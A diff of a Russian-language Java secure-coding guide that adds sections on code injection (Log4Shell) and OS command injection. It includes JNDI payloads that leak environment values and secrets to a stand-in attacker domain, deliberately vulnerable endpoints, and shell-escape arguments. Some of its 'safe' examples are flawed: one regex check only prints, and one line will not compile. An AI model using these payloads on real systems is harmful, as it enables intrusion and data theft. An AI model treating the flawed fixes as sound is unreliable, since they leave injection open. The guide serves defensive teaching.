@@ -8,6 +8,7 @@
 
 <!-- TOC -->
 * [Примеры эксплуатации и устранения CWE в Java](#примеры-эксплуатации-и-устранения-cwe-в-java)
+  * [Запуск:](#запуск)
   * [1.	CWE-611: Improper Restriction of XML External Entity Reference](#1-cwe-611-improper-restriction-of-xml-external-entity-reference)
     * [1.1. Описание](#11-описание)
       * [1.1.1. XInclude](#111-xinclude)
@@ -17,6 +18,61 @@
       * [*Пример 2. Безопасный анмаршаллинг объекта из XML документа*](#пример-2-безопасный-анмаршаллинг-объекта-из-xml-документа)
       * [*Пример 3. Безопасный парсинг при помощи javax.xml.parsers.DocumentBuilder*](#пример-3-безопасный-парсинг-при-помощи-javaxxmlparsersdocumentbuilder)
       * [*Пример 4. Безопасный парсинг при помощи org.dom4j.io.SAXReader*](#пример-4-безопасный-парсинг-при-помощи-orgdom4jiosaxreader)
+  * [2.	CWE-73: External Control of File Name or Path](#2-cwe-73-external-control-of-file-name-or-path)
+    * [2.1. Описание](#21-описание)
+      * ["Null Byte Injection" или "Null Byte Poisoning"](#null-byte-injection-или-null-byte-poisoning)
+    * [2.2. Защитные меры](#22-защитные-меры)
+    * [2.3. Примеры](#23-примеры)
+      * [*Пример 1. Небезопасное составление имени файла*](#пример-1-небезопасное-составление-имени-файла)
+      * [*Пример 2. Небезопасное составление имени файла*](#пример-2-небезопасное-составление-имени-файла)
+      * [*Пример 3. Небезопасное составление имени файла*](#пример-3-небезопасное-составление-имени-файла)
+      * [*Пример 4. Безопасное составление имени файла: нормализация и проверка результирующей директории*](#пример-4-безопасное-составление-имени-файла-нормализация-и-проверка-результирующей-директории)
+      * [*Пример 5. Безопасное составление имени файла: нормализация и проверка результирующей директории*](#пример-5-безопасное-составление-имени-файла-нормализация-и-проверка-результирующей-директории)
+    * [*Пример 6. Безопасное составление имени файла: проверка регулярным выражением и очистка от «..»*](#пример-6-безопасное-составление-имени-файла-проверка-регулярным-выражением-и-очистка-от-)
+  * [3. CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](#3-cwe-89-improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection)
+    * [3.1. Описание](#31-описание)
+    * [3.2. Защитные меры](#32-защитные-меры)
+      * [3.2.1. Использование Prepared Statements](#321-использование-prepared-statements)
+      * [*Пример небезопасного использования класса Statement*](#пример-небезопасного-использования-класса-statement)
+      * [*Пример безопасного использования класса PreparedStatement*](#пример-безопасного-использования-класса-preparedstatement)
+      * [3.2.2. Использование хранимых процедур](#322-использование-хранимых-процедур)
+      * [3.2.3. Проверка ввода по белому списку](#323-проверка-ввода-по-белому-списку)
+      * [3.2.4. Экранирование всех вводимых пользователем данных](#324-экранирование-всех-вводимых-пользователем-данных)
+      * [*Пример использования ESAPI:*](#пример-использования-esapi)
+    * [3.3. Java Persistence API и Hibernate. HQL injection и JPQL injection](#33-java-persistence-api-и-hibernate-hql-injection-и-jpql-injection)
+    * [3.4. Примеры](#34-примеры)
+      * [*Пример 1. Небезопасное использование Hibernate Query Language (HQL)*](#пример-1-небезопасное-использование-hibernate-query-language-hql)
+      * [*Пример 2. Небезопасное использование HQL*](#пример-2-небезопасное-использование-hql)
+      * [*Пример 3. Небезопасное использование HQL*](#пример-3-небезопасное-использование-hql)
+      * [*Пример 4. Безопасное использование HQL*](#пример-4-безопасное-использование-hql)
+      * [*Пример 5. Безопасное использование HQL]*](#пример-5-безопасное-использование-hql)
+      * [*Пример 6. Безопасное использование Java Persistence Query Language (JPQL)*](#пример-6-безопасное-использование-java-persistence-query-language-jpql)
+      * [*Пример 7. Безопасное использование Java Persistence Query Language (JPQL)*](#пример-7-безопасное-использование-java-persistence-query-language-jpql)
+      * [*Пример 8. Безопасное использование Java Persistence Query Language (JPQL)*](#пример-8-безопасное-использование-java-persistence-query-language-jpql)
+      * [*Пример 9. Безопасное использование JPA Criteria API*](#пример-9-безопасное-использование-jpa-criteria-api)
+      * [*Пример 10. Небезопасное использование MyBatis*](#пример-10-небезопасное-использование-mybatis)
+      * [*Пример 11. Безопасное использование MyBatis*](#пример-11-безопасное-использование-mybatis)
+      * [*Пример 12. Небезопасное использование JPQL*](#пример-12-небезопасное-использование-jpql)
+      * [*Пример 13. Корректное использование – белый список*](#пример-13-корректное-использование--белый-список)
+    * [3.5. В заключении](#35-в-заключении)
+    * [3.6. Дополнительная литература](#36-дополнительная-литература)
+  * [4. CWE-94: Improper Control of Generation of Code ('Code Injection')](#4-cwe-94-improper-control-of-generation-of-code-code-injection)
+    * [4.1. Class.forName](#41-classforname)
+    * [4.2. logger.*](#42-logger)
+      * [4.2.1. Условия для появления уязвимости:](#421-условия-для-появления-уязвимости)
+    * [4.3. Защитные меры](#43-защитные-меры)
+    * [4.4. Дополнительная литература](#44-дополнительная-литература)
+  * [5.	CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')](#5-cwe-77-improper-neutralization-of-special-elements-used-in-a-command-command-injection)
+    * [5.1. Описание](#51-описание)
+    * [5.2. Потенциальное воздействие](#52-потенциальное-воздействие)
+    * [5.3. Защитные меры](#53-защитные-меры)
+      * [5.3.1. Стандартные библиотеки и функции Java](#531-стандартные-библиотеки-и-функции-java)
+      * [5.3.2. ProcessBuilder](#532-processbuilder)
+      * [*Пример 1. Некорректное использование*](#пример-1-некорректное-использование)
+      * [*Пример 2. Корректное использование*](#пример-2-корректное-использование)
+      * [*Пример 3. Корректное использование*](#пример-3-корректное-использование)
+      * [5.3.3. Input validation](#533-input-validation)
+    * [5.4.  В заключении](#54-в-заключении)
 <!-- TOC -->
 
 ## 1.	CWE-611: Improper Restriction of XML External Entity Reference
@@ -897,4 +953,370 @@ https://www.programcreek.com/java-api-examples/?api=org.owasp.esapi.ESAPI
 http://www.orafaq.com/wiki/SQL_FAQ#How_does_one_escape_special_characters_when_writing_SQL_queries.3F
 9. JPA Query Parameters Usage
 https://www.baeldung.com/jpa-query-parameters
+
+
+## 4. CWE-94: Improper Control of Generation of Code ('Code Injection')
+
+Code Injection - это общий термин для типов атак, которые заключаются в инъекции кода, который затем интерпретируется/исполняется приложением.
+
+Удаленное выполнение кода (RCE, Remote code execution) – это признанная OWASP уязвимость, которая позволяет злоумышленникам удаленно запускать вредоносный код на целевой системе.
+
+Этот тип атак использует плохую обработку недоверенных данных. Обычно такие атаки становятся возможными из-за отсутствия надлежащей проверки входных/выходных данных, например:
+* разрешенные символы (стандартные классы регулярных выражений или пользовательские)
+* формат данных
+* объем ожидаемых данных
+
+Code Injection отличается от Command Injection тем, что злоумышленник ограничен только функциональностью самого внедряемого языка. Если злоумышленник может внедрить PHP-код в приложение и добиться его выполнения, он ограничен только возможностями PHP.
+
+### 4.1. Class.forName
+
+В Java, например, для выполнения произвольного кода может использоваться `Class.forName("className")`. Метод `forName` используется для загрузки классов, неизвестных в момент компиляции. При загрузке класса автоматически выполняется код из блока `static {}`, что дает возможность злоумышленнику выполнить любой код, например:
+
+```java
+public class evilClass {
+    static {
+        try {
+            Runtime.getRuntime().exec("cmd /c calc.exe");
+        } catch (IOException ignored) {
+        }
+    }
+}
+
+public class Main {
+    public static void main(String[] args) throws ClassNotFoundException {
+        System.out.println("Hello world!");
+        Class.forName("org.example.evilClass");
+    }
+}
+```
+
+### 4.2. logger.*
+
+Один из самых популярных примеров RCE это Log4j Log4Shell 0-Day Vulnerability. Данная CWE часто детектируется PT AI в исходном коде приложений ППОД.
+
+В Apache Log4j 2, популярном фреймворке для организации ведения логов в Java-приложениях, имеется критическая уязвимость, позволяющая выполнить произвольный код при записи в лог специально оформленного значения в формате `{jndi:URL}`. Атака может быть проведена на Java-приложения, записывающие в лог значения, полученные из внешних источников, например, при выводе проблемных значений в сообщениях об ошибках.
+
+Проблема была вызвана тем, что Log4j 2 поддерживает обработку специальных масок `{}` в выводимых в лог строках, позволяющих выполнять различные lookups вида `${prefix:name}`, где name – вычисляемый параметр. Например, `${java:version}` или `${jndi:ldap}`
+
+Примеры Payloads:
+```java
+# Identify Java version and hostname
+${jndi:ldap://${java:version}.domain/a}
+${jndi:ldap://${env:JAVA_VERSION}.domain/a}
+${jndi:ldap://${sys:java.version}.domain/a}
+${jndi:ldap://${sys:java.vendor}.domain/a}
+${jndi:ldap://${hostName}.domain/a}
+${jndi:dns://${hostName}.domain}
+# More enumerations keywords and variables
+java:os
+docker:containerId
+web:rootDir
+bundle:config:db.password
+```
+JNDI, или же Java Naming and Directory Interface, представляет собой Java API для доступа к службам имен и каталогов. Служба имен и каталогов — это система, которая управляет отображением множества имен во множестве объектов. Наиболее наглядным примером такой службы является файловая система. В файловой системе мы взаимодействуем с именами файлов, за которыми скрываются объекты — сами файлы в различных форматах. В службе имен и каталогов именованные объекты собраны в древовидную структуру.
+
+![cwe-94_1.png](readme_img/cwe-94_1.png)
+
+JNDI нужен для того, чтобы мы могли из Java-кода получить Java-объект из некоторой "Регистратуры" объектов по его имени.
+Из популярных примеров служб имен и каталогов (поддерживаемые JNDI) можно выделить LDAP, DNS, RMI и т.д.
+Атака сводится к передаче строки с подстановкой `${jndi:ldap://attacker.com/a}`, при обработке которой Log4j 2 отправит на сервер attacker.com LDAP-запрос пути к Java-классу. Возвращённый сервером атакующего путь (например, http://second-stage.attacker.com/Exploit.class) будет загружен и выполнен в контексте текущего процесса, что позволяет атакующему добиться выполнения произвольного кода в системе с правами текущего приложения.
+
+![cwe-94_2.png](readme_img/cwe-94_2.png)
+
+Подробнее об RMI/LDAP сервере и схеме загрузки payload см. https://www.veracode.com/blog/research/exploiting-jndi-injections-java
+
+Пример кода:
+
+```java
+@RestController
+public class VulnApp {
+    private static final Logger logger = LogManager.getLogger("vulnApp");
+
+    @GetMapping("/")
+    public String index(@RequestHeader("X-Api-Version") String apiVersion) {
+        logger.info("Received a request for API version " + apiVersion);
+        return "Hello, world!";
+    }
+}
+```
+
+Пример эксплуатации уязвимости Log4Shell приведен в приложении 1.
+
+#### 4.2.1. Условия для появления уязвимости:
+* Java приложение использует log4j (Maven package log4j-core) версии 2.0.0-2.12.1 или 2.13.0-2.14.1
+  * Версия 2.12.2 не подвержена уязвимости, так как получила исправления, перенесенные из версии 2.16.0.
+* Злоумышленник может вызвать запись в журнал произвольных строк с помощью одного из API протоколирования – logger.info(), logger.debug(), logger.error(), logger.fatal(), logger.log(), logger.trace(), logger.warn(). 
+* Никаких специфических для Log4j мер по исправлению уязвимости не применяется (см. раздел “Mitigations” в https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/):
+  * Отключение lookups
+  * Удаление уязвимых классов
+* (на некоторых машинах) Используемая версия Java JRE / JDK старше следующих версий: 6u211, 7u201, 8u191, 11.0.1
+
+### 4.3. Защитные меры
+
+Для предотвращения Code Injection необходимо:
+
+1. Не допускать попадания пользовательского ввода в такие методы, как Class.forName и logger.info(), logger.debug(), logger.error(), logger.fatal(), logger.log(), logger.trace(), logger.warn();
+2. Не использовать библиотеку log4j ниже версии 2.16.0, за исключением 2.12.2;
+3. Если невозможно применить указанные в п.п. 1 и 2 меры, необходимо производить санитизацию/ валидацию передаваемых в методы пользовательских значений.
+
+### 4.4. Дополнительная литература
+
+Тренажер по данной CVE:
+https://application.security/free-application-security-training/understanding-apache-log4j-vulnerability
+
+Источники:
+1. https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html
+2. https://russianblogs.com/article/9324971904/
+3. https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/
+4. https://www.veracode.com/blog/research/exploiting-jndi-injections-java
+5. https://github.com/pimps/JNDI-Exploit-Kit
+6. https://www.opennet.ru/opennews/art.shtml?num=56319
+7. https://www.trendmicro.com/ru_ru/what-is/apache-log4j-vulnerability.html
+8. https://www.kitploit.com/2022/02/jndi-injection-exploit-tool-which.html
+9. https://qwiet.ai/log4shell-jndi-injection-via-attackable-log4j/
+10. https://github.com/christophetd/log4shell-vulnerable-app
+
+Полезные ссылки:
+
+1. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
+2. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md
+3. https://github.com/fullhunt/log4j-scan
+4. https://github.com/lucy9x/JNDI-Exploit-Kit
+5. https://github.com/Jeromeyoung/JNDIExploit-1
+
+
+## 5.	CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
+
+![cwe-77_1.png](readme_img/cwe-77_1.png)
+
+В данную категорию так же входят:
+* CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
+* CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')
+
+### 5.1. Описание
+
+Данные уязвимости обычно возникают, когда:
+1. Данные попадают в приложение из недоверенного источника;
+2. Данные являются частью строки, которая выполняется приложением как команда;
+3. Выполнив команду, приложение предоставляет злоумышленнику привилегии или возможности, которых у него иначе не было бы.
+
+Существует два основных подтипа OS Command Injection:
+
+1. Внешние данные в качестве аргументов
+	
+Приложение выполняет фиксированную программу, которая находится под его контролем и принимает внешние данные в качестве аргументов для этой программы.
+
+_Пример:_ Программа использует вызов `system("nslookup [HOSTNAME]")` для запуска `nslookup`, а в качестве аргумента пользователь указывает `HOSTNAME`. Хакер не может предотвратить выполнение `nslookup`, но, если программа не удаляет разделители из аргумента `HOSTNAME`, переданного извне, злоумышленник может поместить разделители внутрь аргумента и выполнить свою собственную команду.
+
+В качестве разделителей могут использоваться:
+
+Windows и Unix-based OS:
+* &
+* &&
+* |
+* ||
+
+Только Unix-based OS:
+* ;
+* Newline (0x0a or \n)
+
+Для вставки подзапроса в исходную команду используются символы `$` и \` :
+* $(injected command)
+* \`injected command\`
+
+2. Внешние данные в качестве команды
+
+Приложение использует входные данные для выбора программы для запуска и команд. Приложение дезинфицирует вводимые данные, а затем просто перенаправляет всю команду операционной системе.
+Пример: Приложение использует `exec([COMMAND])`, в то время как `[COMMAND]` поступает из внешнего источника. Хакер, контролирующий аргумент `[COMMAND]`, может выполнять произвольные команды или программы в системе.
+
+### 5.2. Потенциальное воздействие
+
+Злоумышленник может использовать эту слабость для выполнения произвольных команд, раскрытия конфиденциальной информации и отказа в обслуживании. Любые вредоносные действия будут исходить от уязвимого приложения и выполняться в контексте безопасности этого приложения.
+
+Пример эксплуатации:
+
+Вводимый пользователем IP адрес подставляется в команду с помощью конкатенации строк.
+
+```java
+@GetMapping("/ping")
+public String executePingCommand(@RequestParam String ip) throws IOException {
+    String command = "cmd /c ping -n 1 " + ip;
+    Process p = Runtime.getRuntime().exec(command);
+
+    BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+    String line;
+    StringBuilder sb = new StringBuilder();
+    
+    while ((line = input.readLine()) != null) {
+        sb.append(line).append("\n");
+    }
+    input.close();
+    return sb.toString();
+}
+```
+
+Используя разделитель `&` (`%26`) можно передать несколько произвольных команд:
+
+![cwe-77_2.png](readme_img/cwe-77_2.png)
+
+### 5.3. Защитные меры
+
+#### 5.3.1. Стандартные библиотеки и функции Java
+
+Самый эффективный способ предотвратить уязвимости инъекции команд ОС - никогда не обращаться к командам ОС из кода прикладного уровня. Почти во всех случаях существуют различные способы реализации требуемой функциональности с помощью более безопасных API-интерфейсов платформы.
+
+Например, для вывода содержимого каталога вместо
+```java
+String comm = "cmd.exe /c dir " + user_path;
+Process process = Runtime.getRuntime().exec(comm);
+```
+Используйте
+```java
+Files.list(new File(user_path).toPath())
+        .limit(10)
+        .forEach(System.out::println);
+```
+
+#### 5.3.2. ProcessBuilder
+
+Если выполнение команд ОС избежать невозможно, используйте java.lang.ProcessBuilder.
+
+>Важно! Команда и каждый из аргументов должен передаваться отдельно. В таком случае, все, что следует за основной командой, будет расцениваться как аргументы, и экранироваться, в случае необходимости.
+
+>Важно! Некоторые команды поддерживают параметры, позволяющие в качестве аргумента передавать и выполнять дополнительные команды. Например,
+`find . -exec /bin/sh`
+или
+`man man`
+`!/bin/sh`
+Полный список таких команд представлен на ресурсе https://gtfobins.github.io/
+В случае необходимости использования одной из таких команд, необходимо дополнительно валидировать пользовательский ввод на предмет содержания параметров, позволяющих выполнять дополнительные команды.
+
+#### *Пример 1. Некорректное использование*
+В данном случае введенный пользователем IP конкатенируется с основной командой ping. В результате получившаяся строка воспринимается как отдельная команда, а не команда с определенным и заранее известным набором аргументов, что позволяет эксплуатировать слабость, используя разделители.
+```java
+@GetMapping("/pingPb1")
+public String pingProcessUnsafe(@RequestParam String ip) throws IOException {
+    ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "ping -n 1 " + ip);
+    Process p = pb.start();
+```
+
+#### *Пример 2. Корректное использование*
+Не включайте аргументы команды в командную строку, вместо этого используйте параметризацию:
+```java
+@GetMapping("/pingPb2")
+public String pingProcessSafe(@RequestParam String ip) throws IOException {
+    ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "ping -n 1", ip);
+    Process p = pb.start();
+```
+
+#### *Пример 3. Корректное использование*
+В данном примере производится проверка команды по белому списку. Т.к. в белом списке имеется команда `find`, позволяющая передать параметр `–exec { command}`, реализована дополнительная проверка аргументов по черному списку.
+
+```java
+static {
+    allowedCommands.add("pwd");
+    allowedCommands.add("ls");
+    allowedCommands.add("ps");
+    allowedCommands.add("find");
+    allowedCommands.add("uname");
+    allowedCommands.add("free");
+    allowedCommands.add("df");
+    allowedCommands.add("locate");
+    allowedCommands.add("hostname");
+
+    denyArguments.add("-exec");
+}
+
+@GetMapping("/cmdSafety")
+public String execCommandSafety(
+        @RequestParam(value = "command") String command,
+        @RequestParam(value = "args[]", required = false) List<String> args) throws IOException {
+    final List<String> cmd = new ArrayList<>();
+
+    if (command == null || command.isEmpty()) {
+        throw new IllegalArgumentException("Укажите команду");
+    }
+    command = command.trim().toLowerCase();
+
+    if (!allowedCommands.contains(command)) {
+        throw new IllegalArgumentException("Недопустимая команда");
+    }
+
+    cmd.add(command);
+
+    if (args != null) {
+        for (String arg : args) {
+            if (denyArguments.contains(arg.trim().toLowerCase())) {
+                throw new IllegalArgumentException("Недопустимый аргумент");
+            }
+        }
+        cmd.addAll(args);
+    }
+
+    ProcessBuilder pb = new ProcessBuilder(cmd);
+    
+    // ... start process, handle exit value, input and error streams, return result
+}
+```
+
+#### 5.3.3. Input validation
+В крайнем случае, если отсутствует возможность использования `ProcessBuilder`, можно воспользоваться `Runtime.getRuntime().exec(command)`, предварительно проверив команду по черным/ белым спискам и проверив на наличие опасных спец. символов ``& |  ; $ > < ` \ ! ' " ( ) 0x0a`` с помощью регулярных выражений:
+
+```java
+static Set<String> allowedCommands = new HashSet<>();
+static Set<String> denyArguments = new HashSet<>();
+
+static {
+    allowedCommands.add("pwd");
+    allowedCommands.add("ls");
+    allowedCommands.add("ps");
+    allowedCommands.add("find");
+    allowedCommands.add("uname");
+    allowedCommands.add("free");
+    allowedCommands.add("df");
+    allowedCommands.add("locate");
+    allowedCommands.add("hostname");
+
+    denyArguments.add("-exec");
+}
+
+
+@GetMapping("/cmdRuntimeSafe")
+public String execRuntimeCommandSafety(@RequestParam String inputCmd) throws IOException {
+    if (inputCmd == null || inputCmd.isEmpty()) {
+        throw new IllegalArgumentException("Укажите команду");
+    }
+
+    if (Pattern.matches("^.*(([&|;$><`\\\\!'\"()])|(0x0[Aa])).*$", inputCmd)) {
+        System.out.println("Недопустимая команда");
+    }
+
+    final String[] command = inputCmd.split(" ");
+
+    if (!allowedCommands.contains(command[0].toLowerCase())) {
+        throw new IllegalArgumentException("Недопустимая команда");
+    }
+    for (String arg : command) {
+        if (denyArguments.contains(arg.toLowerCase())) {
+            throw new IllegalArgumentException("Недопустимый аргумент");
+        }
+    }
+    // ... start process, handle exit value, input and error streams, return result
+```
+
+Так же опасные спец. символы можно удалить, или заменить на безопасные:
+```java
+String strip = inputCmd.replaceAll"[&|;$><`\\\\!'\"()]+","");
+String strip2 = inputCmd.replaceAll("[^a-zA-Z 0-9]","");
+String escape = inputCmd.replaceAll("[^a-zA-Z 0-9]","_");
+```
+
+### 5.4.  В заключении
+Для предотвращения CWE-77: 'Command Injection' необходимо выполнять следующие рекомендации:
+1.	Используйте безопасные API-интерфейсы платформы вместо прямого вызова команд ОС;
+2.	Используйте структурированные механизмы, которые автоматически обеспечивают разделение данных и команд (параметризацию). Например - `java.lang.ProcessBuilder`;
+3.	Проверяйте команды и аргументы по белым и/или черным спискам;
+4.	Не допускайте наличие символов ``& |  ; $ > < ` \ ! ' " ( ) 0x0a`` во входных данных;
+5.	Используйте принцип наименьших привилегий для учетной записи, под которой работает приложение.
 
